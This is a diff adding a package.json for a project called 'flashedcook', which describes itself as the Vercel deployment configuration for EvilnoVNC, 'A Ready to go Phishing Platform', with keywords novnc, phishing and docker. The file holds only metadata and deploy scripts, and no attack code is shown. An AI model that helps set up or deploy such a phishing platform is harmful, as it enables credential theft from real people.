@@ -1,0 +1,29 @@
+{
+  "name": "flashedcook",
+  "version": "1.0.0",
+  "description": "EvilnoVNC - A Ready to go Phishing Platform (Vercel deployment configuration)",
+  "private": true,
+  "scripts": {
+    "deploy": "vercel --prod",
+    "deploy:preview": "vercel"
+  },
+  "keywords": [
+    "novnc",
+    "phishing",
+    "docker"
+  ],
+  "author": "",
+  "license": "GPL-3.0",
+  "devDependencies": {},
+  "engines": {
+    "node": ">=14.x"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/therealelyayo/flashedcook.git"
+  },
+  "bugs": {
+    "url": "https://github.com/therealelyayo/flashedcook/issues"
+  },
+  "homepage": "https://github.com/therealelyayo/flashedcook#readme"
+}
